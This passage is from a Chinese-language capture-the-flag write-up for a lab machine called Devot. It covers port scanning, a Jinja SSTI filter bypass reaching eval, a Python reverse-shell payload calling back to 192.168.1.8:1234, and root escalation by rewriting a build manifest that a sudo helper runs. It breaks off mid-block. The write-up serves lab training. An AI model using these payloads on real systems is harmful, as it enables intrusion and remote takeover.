+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">port_range</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">q</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;http://127.0.0.1:</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ths</span> <span class="o">=</span> <span class="p">[</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,</span><span class="n">res</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">threads</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">ths</span><span class="p">:</span> <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">ths</span><span class="p">:</span> <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Scan finished&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scan</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">65536</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>扫描结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 scan_port.py
+</span></span><span class="line"><span class="cl">http://127.0.0.1:22/  <span class="o">=</span>&gt; Import failed: SSH-2.0-OpenSSH_10.5
+</span></span><span class="line"><span class="cl">http://127.0.0.1:80/  <span class="o">=</span>&gt; Imported README from http://127.0.0.1:80/ <span class="o">(</span>HTTP 200, <span class="m">1967</span> bytes<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">http://127.0.0.1:7311/  <span class="o">=</span>&gt; Imported README from http://127.0.0.1:7311/ <span class="o">(</span>HTTP 200, <span class="m">121</span> bytes<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">http://127.0.0.1:8000/  <span class="o">=</span>&gt; Imported README from http://127.0.0.1:8000/ <span class="o">(</span>HTTP 200, <span class="m">1967</span> bytes<span class="o">)</span>.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>8000</code> 端口就和 <code>80</code> 是一样的。</p>
+<p>而 <code>7311</code> 端口为 <code>devot-render</code>，暴露了三个接口。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">devot-render 2.6.1
+</span></span><span class="line"><span class="cl">internal template service
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GET  /healthz
+</span></span><span class="line"><span class="cl">GET  /render?template<span class="o">=</span>&lt;template&gt;<span class="p">&amp;</span><span class="nv">context</span><span class="o">=</span>&lt;json&gt;
+</span></span><span class="line"><span class="cl">POST /render
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于我们只能使用 <code>http/https</code> 协议，所以只能发 <code>GET</code> 请求。</p>
+<p>访问 <code>/healthz</code>，回显<code>{&quot;ok&quot;: true, &quot;service&quot;: &quot;devot-render&quot;, &quot;version&quot;: &quot;2.6.1&quot;}</code>。</p>
+<p>而 <code>/render?template=&lt;template&gt;&amp;context=&lt;json&gt;</code>，由于背后是一个 Python 后端，然后这里还有 <code>&lt;template&gt;</code> ，怀疑有 SSTI 存在。</p>
+<h3 id="ssti">SSTI
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:7311/render?template<span class="o">={{</span>7*7<span class="o">}}</span><span class="p">&amp;</span><span class="nv">context</span><span class="o">={}</span> <span class="c1"># 回显49</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>说明成功解析了，存在 SSTI。</p>
+<p>然后正常打一些利用链，发现 <code>__init__</code>，<code>__class__</code> 这种常用的都被 ban 了，然后又试了 <code>{{config}}</code> 这种，回显是空。</p>
+<p>经过测试，<code>lipsum</code> 和 <code>__getattribute__</code> 没被限制，可以执行 <code>eval</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:7311/render?template<span class="o">={{</span>lipsum.__getattribute__<span class="o">(</span><span class="s1">&#39;__globals__&#39;</span><span class="o">)[</span><span class="s1">&#39;__builtins__&#39;</span><span class="o">][</span><span class="s1">&#39;eval&#39;</span><span class="o">](</span><span class="s1">&#39;7*7&#39;</span><span class="o">)}}</span><span class="p">&amp;</span><span class="nv">context</span><span class="o">={}</span> <span class="c1"># 49</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://127.0.0.1:7311/render?template<span class="o">={{</span>lipsum.__getattribute__<span class="o">(</span><span class="s1">&#39;__globals__&#39;</span><span class="o">)[</span><span class="s1">&#39;__builtins__&#39;</span><span class="o">][</span><span class="s1">&#39;eval&#39;</span><span class="o">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;</span><span class="o">)}}</span><span class="p">&amp;</span><span class="nv">context</span><span class="o">={}</span> <span class="c1"># uid=103(devot) gid=104(devot) groups=104(devot),104(devot)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://127.0.0.1:7311/render?template<span class="o">={{</span>lipsum.__getattribute__<span class="o">(</span><span class="s1">&#39;__globals__&#39;</span><span class="o">)[</span><span class="s1">&#39;__builtins__&#39;</span><span class="o">][</span><span class="s1">&#39;eval&#39;</span><span class="o">](</span>cmd<span class="o">)}}</span><span class="p">&amp;</span><span class="nv">context</span><span class="o">={</span><span class="s2">&#34;cmd&#34;</span>:<span class="s2">&#34;__import__(&#39;subprocess&#39;).Popen([__import__(&#39;sys&#39;).executable,&#39;-c&#39;,&#39;import socket,subprocess,os;s=socket.socket();s.connect((\&#34;192.168.1.8\&#34;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([os.getenv(\&#34;SHELL\&#34;) or \&#34;/bin/sh\&#34;,\&#34;-i\&#34;])&#39;])&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开启端口监听，准备接收反弹 Shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行命令（需要无空格）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:7311/render?template<span class="o">={{</span>lipsum.__getattribute__<span class="o">(</span><span class="s1">&#39;__globals__&#39;</span><span class="o">)[</span><span class="s1">&#39;__builtins__&#39;</span><span class="o">][</span><span class="s1">&#39;eval&#39;</span><span class="o">](</span>cmd<span class="o">)}}</span><span class="p">&amp;</span><span class="nv">context</span><span class="o">={</span><span class="s2">&#34;cmd&#34;</span>:<span class="s2">&#34;__import__(&#39;subprocess&#39;).Popen([__import__(&#39;sys&#39;).executable,&#39;-c&#39;,&#39;so=__import__(\&#34;socket\&#34;);os=__import__(\&#34;os\&#34;);sp=__import__(\&#34;subprocess\&#34;);sk=so.socket();sk.connect((\&#34;192.168.1.8\&#34;,1234));os.dup2(sk.fileno(),0);os.dup2(sk.fileno(),1);os.dup2(sk.fileno(),2);sp.call([os.getenv(\&#34;SHELL\&#34;)or\&#34;/bin/sh\&#34;,\&#34;-i\&#34;])&#39;])&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.1.8<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.1.7<span class="o">]</span> <span class="m">60480</span>
+</span></span><span class="line"><span class="cl">/bin/sh: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">/ $ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>103<span class="o">(</span>devot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>104<span class="o">(</span>devot<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>104<span class="o">(</span>devot<span class="o">)</span>,104<span class="o">(</span>devot<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>稳定 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl">Ctrl + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取 user flag。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Devot:~$ <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/home/devot
+</span></span><span class="line"><span class="cl">Devot:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">flag<span class="o">{</span>user-a6f20dad5d39d607b571eee241bb2376<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="提权">提权
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Devot:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> devot on Devot:
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Runas and Command-specific defaults <span class="k">for</span> devot:
+</span></span><span class="line"><span class="cl">    Defaults!/usr/sbin/visudo <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;SUDO_EDITOR EDITOR VISUAL&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User devot may run the following commands on Devot:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/bin/devot-build
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">Devot:~$ cat /usr/local/bin/devot-build
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/sh</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Root-side preview build helper.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The web tier invokes this through sudo; the manifest is written by devot.</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> -eu
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">project</span><span class="o">=</span><span class="si">${</span><span class="nv">1</span><span class="k">:-</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># $project只能是字母和数字、下划线、短横线,且长度不超40字符</span>
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="s2">&#34;</span><span class="nv">$project</span><span class="s2">&#34;</span> in
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;</span><span class="p">|</span>*<span class="o">[</span>!A-Za-z0-9_-<span class="o">]</span>*<span class="o">)</span> <span class="nb">echo</span> <span class="s1">&#39;{&#34;ok&#34;:false,&#34;error&#34;:&#34;invalid project&#34;}&#39;</span> &gt;<span class="p">&amp;</span>2<span class="p">;</span> <span class="nb">exit</span> <span class="m">2</span> <span class="p">;;</span>
+</span></span><span class="line"><span class="cl"><span class="k">esac</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span> <span class="s2">&#34;</span><span class="si">${#</span><span class="nv">project</span><span class="si">}</span><span class="s2">&#34;</span> -le <span class="m">40</span> <span class="o">]</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s1">&#39;{&#34;ok&#34;:false,&#34;error&#34;:&#34;invalid project&#34;}&#39;</span> &gt;<span class="p">&amp;</span>2<span class="p">;</span> <span class="nb">exit</span> 2<span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># manifest 文件存在且可读</span>
+</span></span><span class="line"><span class="cl"><span class="nv">manifest</span><span class="o">=</span><span class="s2">&#34;/var/lib/devot/builds/</span><span class="nv">$project</span><span class="s2">.json&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -r <span class="s2">&#34;</span><span class="nv">$manifest</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s1">&#39;{&#34;ok&#34;:false,&#34;error&#34;:&#34;manifest missing&#34;}&#39;</span> &gt;<span class="p">&amp;</span>2<span class="p">;</span> <span class="nb">exit</span> 3<span class="p">;</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">token</span><span class="o">=</span><span class="k">$(</span>cat /etc/devot/runner.token<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 创建临时文件</span>
+</span></span><span class="line"><span class="cl"><span class="nv">header</span><span class="o">=</span><span class="k">$(</span>mktemp /tmp/devot-build.XXXXXX<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 脚本退出自动清理这个临时文件</span>
+</span></span><span class="line"><span class="cl"><span class="nb">trap</span> <span class="s1">&#39;rm -f &#34;$header&#34;&#39;</span> EXIT
+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> <span class="s2">&#34;</span><span class="nv">$header</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Auth 写入临时文件</span>
+</span></span><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s1">&#39;Authorization: Bearer %s\n&#39;</span> <span class="s2">&#34;</span><span class="nv">$token</span><span class="s2">&#34;</span> &gt; <span class="s2">&#34;</span><span class="nv">$header</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">rc</span><span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 发起curl请求 unix套接字通信</span>
+</span></span><span class="line"><span class="cl">/usr/bin/curl -q -sS --unix-socket /run/devot/runner.sock <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -H @<span class="s2">&#34;</span><span class="nv">$header</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -H <span class="s1">&#39;Content-Type: application/json&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    --data-binary @<span class="s2">&#34;</span><span class="nv">$manifest</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    http://localhost/v1/jobs <span class="o">||</span> <span class="nv">rc</span><span class="o">=</span><span class="nv">$?</span>
+</span></span><span class="line"><span class="cl">rm -f <span class="s2">&#34;</span><span class="nv">$header</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="s2">&#34;</span><span class="nv">$rc</span><span class="s2">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Devot:~$ ls -la /var/lib/devot/builds
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">2</span> devot    devot         <span class="m">4096</span> Nov <span class="m">16</span> 22:01 .
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">4</span> devot    devot         <span class="m">4096</span> Nov <span class="m">16</span> 22:01 ..
+</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> devot    devot          <span class="m">182</span> Nov <span class="m">16</span> 22:01 web.json
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的 <code>web.json</code> 是我们 Web 端创建并构建项目时生成的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Devot:~$ cat /var/lib/devot/builds/web.json 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;project&#34;</span>: <span class="s2">&#34;web&#34;</span>, <span class="s2">&#34;kind&#34;</span>: <span class="s2">&#34;build&#34;</span>, <span class="s2">&#34;steps&#34;</span>: <span class="o">[{</span><span class="s2">&#34;run&#34;</span>: <span class="s2">&#34;echo &#39;devot: resolving ref&#39;&#34;</span><span class="o">}</span>, <span class="o">{</span><span class="s2">&#34;run&#34;</span>: <span class="s2">&#34;echo &#39;devot: staging workspace&#39;&#34;</span><span class="o">}</span>, <span class="o">{</span><span class="s2">&#34;run&#34;</span>: <span class="s2">&#34;echo &#39;devot: compile ok&#39;&#34;</span><span class="o">}]</span>, <span class="s2">&#34;timeout&#34;</span>: 25<span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat web.json<span class="p">|</span>jq . 
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;project&#34;</span>: <span class="s2">&#34;web&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;kind&#34;</span>: <span class="s2">&#34;build&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;steps&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;run&#34;</span>: <span class="s2">&#34;echo &#39;devot: resolving ref&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;run&#34;</span>: <span class="s2">&#34;echo &#39;devot: staging workspace&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;run&#34;</span>: <span class="s2">&#34;echo &#39;devot: compile ok&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">]</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;timeout&#34;</span>: <span class="m">25</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的 <code>echo 'devot: resolving ref'</code> 被执行，说明此处可用于进行命令执行。</p>
+<p>而这里的文件我们是有写入权限的，所以尝试写入命令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">// kali
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> -n <span class="s1">&#39;{&#34;project&#34;: &#34;web&#34;, &#34;kind&#34;: &#34;build&#34;, &#34;steps&#34;: [{&#34;run&#34;: &#34;id&#34;}], &#34;timeout&#34;: 25}&#39;</span> <span class="p">|</span> base64
+</span></span><span class="line"><span class="cl"><span class="nv">eyJwcm9qZWN0IjogIndlYiIsICJraW5kIjogImJ1aWxkIiwgInN0ZXBzIjogW3sicnVuIjogImlkIn1dLCAidGltZW91dCI6IDI1fQ</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 靶机
+</span></span><span class="line"><span class="cl">Devot:~$ <span class="nb">echo</span> <span class="nv">eyJwcm9qZWN0IjogIndlYiIsICJraW5kIjogImJ1aWxkIiwgInN0ZXBzIjogW3sicnVuIjogImlkIn1dLCAidGltZW91dCI6IDI1fQ</span><span class="o">==</span> <span class="p">|</span> base64 -d &gt; /var/lib/devot/builds/web.json
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Devot:~$ sudo /usr/local/bin/devot-build web
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;ok&#34;</span>: true, <span class="s2">&#34;job&#34;</span>: <span class="s2">&#34;j-40f60c8da24c230f&#34;</span>, <span class="s2">&#34;project&#34;</span>: <span class="s2">&#34;web&#34;</span>, <span class="s2">&#34;kind&#34;</span>: <span class="s2">&#34;build&#34;</span>, <span class="s2">&#34;exit&#34;</span>: 0, <span class="s2">&#34;stdout&#34;</span>: <span class="s2">&#34;uid=0(root) gid=0(root)\n&#34;</span>, <span class="s2">&#34;stderr&#34;</span>: <span class="s2">&#34;&#34;</span>, <span class="s2">&#34;duration_ms&#34;</span>: 4, <span class="s2">&#34;notification&#34;</span>: <span class="s2">&#34;&lt;h1&gt;Preview success&lt;/h1&gt;\n&lt;p&gt;Project &lt;strong&gt;web&lt;/strong&gt; on branch &lt;code&gt;main&lt;/code&gt; finished with exit &lt;strong&gt;0&lt;/strong&gt;.&lt;/p&gt;&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据输出的 <code>uid=0(root) gid=0(root)</code> 可知以 root 身份执行了命令。</p>
+<p>我将命令修改为 <code>cat /root/root.txt</code>，结果没有执行成功。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Devot:~$ sudo /usr/local/bin/devot-build web
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;ok&#34;</span>: false, <span class="s2">&#34;error&#34;</span>: <span class="s2">&#34;step rejected by build policy&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找一下这个 <code>build policy</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
